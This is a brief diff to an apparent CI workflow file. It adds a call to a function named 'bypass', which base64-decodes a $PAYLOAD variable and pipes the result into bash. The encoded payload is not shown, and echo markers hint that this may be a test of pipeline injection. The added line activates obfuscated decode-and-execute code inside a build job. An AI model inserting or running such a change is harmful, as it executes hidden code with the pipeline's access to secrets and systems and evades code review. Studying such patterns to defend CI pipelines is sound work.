@@ -27,4 +27,5 @@ jobs:
           function bypass() {
             echo "$PAYLOAD" | base64 --decode | bash
           }
+          bypass()
           echo "<<<<< after payload run"
